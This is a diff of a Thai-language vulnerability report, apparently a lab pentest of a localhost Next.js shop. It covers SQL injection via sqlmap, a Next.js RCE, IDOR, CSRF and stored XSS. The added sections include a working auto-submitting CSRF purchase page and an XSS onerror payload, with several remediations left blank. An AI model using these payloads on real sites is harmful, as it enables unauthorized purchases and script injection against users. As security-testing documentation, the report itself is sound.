@@ -50,18 +50,17 @@ sqlmap  -u  "http://localhost:8888/api/login"  --data='{"username":"test","passw
 
 - เพราะ ระบบมีการเอา `username` และ `password` ไปใส่ใน query ของ SQL โดยตรง
   ทำให้สามารถใช้สัญลักษณ์พิเศษ เช่น ' หรือ -- เพื่อโจมตีได้
-
-### Remediation (วิธีการแก้)
-
-- เว้นว่างไว้ก่อน
-
 - **Vulnerable Code:**
 
 ```javascript
 const queryText = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}';`;
 ```
 
-## VULN-02: Remote Code Execution (RCE) in Next.js
+### Remediation (วิธีการแก้)
+
+- เว้นว่างไว้ก่อน
+
+## VULN-02: RCE in Next.js via React Server Components
 
 - **Severity:** **CRITICAL** (CVSS v3.1: 9.8)
 
@@ -95,10 +94,6 @@ node_modules/next
 
 โปรเจกต์มีการเรียกใช้ `Next.js` เวอร์ชัน `15.5.1-canary.0` ซึ่งเป็นเวอร์ชันที่มีช่องโหว่ RCE อนุญาตให้ผู้โจมตีรันคำสั่งอันตรายบน Server ได้
 
-### Remediation (วิธีการแก้)
-
-ทำการอัปเดต Package เป็นเวอร์ชัน `15.5.7` ตามคำแนะนำของ Security Advisory
-
 **Vulnerable Code:**
 
 ```
@@ -107,9 +102,13 @@ node_modules/next
 }
 ```
 
+### Remediation (วิธีการแก้)
+
+ทำการอัปเดต Package เป็นเวอร์ชัน `15.5.7` ตามคำแนะนำของ Security Advisory
+
 ## VULN-03: Insecure Direct Object Reference (IDOR)
 
-- **Severity:** \***\*HIGH\*\***
+- **Severity:** \***\*HIGH\*\*** (CVSS v3.1: 7.1)
 
 - **Location:** src/app/api/buy/route.ts
 
@@ -148,13 +147,110 @@ Content-Type:  application/json
 ### Root Cause Analysis (สาเหตุ)
 
 - API รับค่า `userId` จาก request แต่ไม่ได้ตรวจสอบว่าคนส่ง request นั้น มี userId ตรงกับที่ส่งมาใน body
+  **Vulnerable Code:**
+
+```typescript
+userId = typeof body.userId === "number" ? body.userId : 0;
+```
 
 ### Remediation (วิธีการแก้)
 
 - ตรวจสอบว่า `session.user.id` (จากฝั่ง Server) ตรงกับ `userId` ที่จะทำการแก้ไข/สั่งซื้อ หรือไม่ แทนการรับค่า `userId` จาก Body
 
-**Vulnerable Code:**
+## VULN-04: Cross-Site Request Forgery (CSRF)
 
-```typescript
-userId = typeof body.userId === "number" ? body.userId : 0;
+- **Severity:** **MEDIUM** (CVSS v3.1: 6.5)
+
+- **Location:** src/app/api/buy/route.ts
+
+- **Reference:** OWASP Top 10 (2021): A01:2021 – Broken Access Control
+
+### Discovery (การค้นพบ)
+
+-ใน API ของการสั่งซื้อพบว่ามีการใช้ Cookie การยืนยันตัวตนเพียงอย่างเดียว และไม่มีการใช้ Anti-CSRF Token
+
+**Steps to Reproduce:**
+
+1. ให้เหยื่อ Login เข้าสู่ระบบด้วยบัญชีเหยื่อ
+2. สร้างไฟล์ html ใช้หลอกให้เหยื่อกด
+3. หลอกให้เหยื่อเปิดไฟล์ขณะ Login อยู่
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>csrf_attack.html</title>
+  </head>
+  <body>
+    <h1>กำลังโหลด</h1>
+    <form action="http://localhost:8888/api/buy" method="POST" id="hackForm">
+      <input type="hidden" name="productId" value="1" />
+      <input type="hidden" name="quantity" value="1" />
+      <!-- for IDOR attack -->
+      <!-- <input type="hidden" name="userId" value="1" /> -->
+    </form>
+    <script>
+      document.getElementById("hackForm").submit();
+    </script>
+  </body>
+</html>
 ```
+
+### Root Cause Analysis (สาเหตุ)
+
+1. ระบบใช้การแนบ Cookie ไปกับ request ในการยืนยันตัวตนโดยไม่สนใจว่า request นั้น มาจากเว็บที่ถูกต้องหรือไม่
+2. ไม่มีการใช้ CSRF Token และไม่ตั้งค่า Samsite ให้เหมาะสม
+
+- **Vulnerable Code:**
+
+```ts
+response.cookies.set("session_token", user.username, {
+  httpOnly: false,
+  path: "/",
+  secure: true,
+  sameSite: "none",
+});
+```
+
+### Remediation (วิธีการแก้)
+
+- เว้นไว้ก่อน
+
+## VULN-05: Stored Cross-Site Scripting (XSS)
+
+- **Severity:** **MEDIUM ** (CVSS v3.1: 5.4)
+
+- **Location:** src/app/product/[id]/page.tsx
+
+- **Reference:** OWASP Top 10 (2021): A03:2021 – Injection
+
+### Discovery (การค้นพบ)
+
+- ทดลองกรอก HTML Tag และ JavaScript ลงในช่องคอมเมนต์
+- กลับมาดูที่หน้า product ว่า Script กรอกไปว่าทำไหม
+
+**Steps to Reproduce:**
+1.Login เข้าสู่ระบบ 2. ไปที่หน้า Product 3. กรอก Payload นี้ในช่อง comment
+
+```
+<img src=x onerror=alert("XSS_Hacked")>
+```
+
+### Root Cause Analysis (สาเหตุ)
+
+- มีการใช้ `dangerouslySetInnerHTML` โดยไม่มีการ Sanitize ข้อมูลที่กรอกก่อน
+  **Vulnerable Code:**
+
+```html
+<div
+  className="text-gray-800 text-lg"
+  dangerouslySetInnerHTML="{{"
+  __html:
+  review.review_content
+  }}
+/>
+```
+
+### Remediation (วิธีการแก้)
+
+- เว้นไว้ก่อน
